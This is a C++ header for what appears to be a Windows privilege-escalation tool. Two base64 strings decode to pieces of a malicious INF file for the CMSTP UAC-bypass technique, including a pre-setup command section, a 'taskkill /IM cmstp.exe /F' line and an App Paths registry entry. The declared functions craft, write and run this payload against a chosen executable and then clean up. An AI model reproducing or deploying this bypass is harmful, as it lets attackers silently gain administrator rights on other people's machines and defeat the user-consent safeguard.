#pragma once
#include <string>
#include <filesystem>
#include <fstream>
#include <Windows.h>
#include <Tlhelp32.h>
#include "logger.h"


namespace payload {
	static std::string part1 = "W3ZlcnNpb25dDQpTaWduYXR1cmU9JGNoaWNhZ28kDQpBZHZhbmNlZElORj0yLjUNCltEZWZhdWx0SW5zdGFsbF0NCkN1c3RvbURlc3RpbmF0aW9uPUN1c3RJbnN0RGVzdFNlY3Rpb25BbGxVc2Vycw0KUnVuUHJlU2V0dXBDb21tYW5kcz1SdW5QcmVTZXR1cENvbW1hbmRzU2VjdGlvbg0KW1J1blByZVNldHVwQ29tbWFuZHNTZWN0aW9uXQ==";
	static std::string part2 = "dGFza2tpbGwgL0lNIGNtc3RwLmV4ZSAvRg0KW0N1c3RJbnN0RGVzdFNlY3Rpb25BbGxVc2Vyc10NCjQ5MDAwLDQ5MDAxPUFsbFVTZXJfTERJRFNlY3Rpb24sIDcNCltBbGxVU2VyX0xESURTZWN0aW9uXQ0KIkhLTE0iLCAiU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQXBwIFBhdGhzXENNTUdSMzIuRVhFIiwgIlByb2ZpbGVJbnN0YWxsUGF0aCIsICIlVW5leHBlY3RlZEVycm9yJSIsICIiDQpbU3RyaW5nc10=";
}

namespace utils {
	std::string b64_decode(const std::string_view szBuffer);
	bool create_process(std::string szCommandLine);
	void kill_by_name(const char* filename);
	std::string random_string(size_t nLength);
}

namespace deploy {
	std::string craft_payload(std::string szExecutablePath);
	void write_payload(std::string szExecutablePath);
	bool run_payload();
	bool cleanup();
}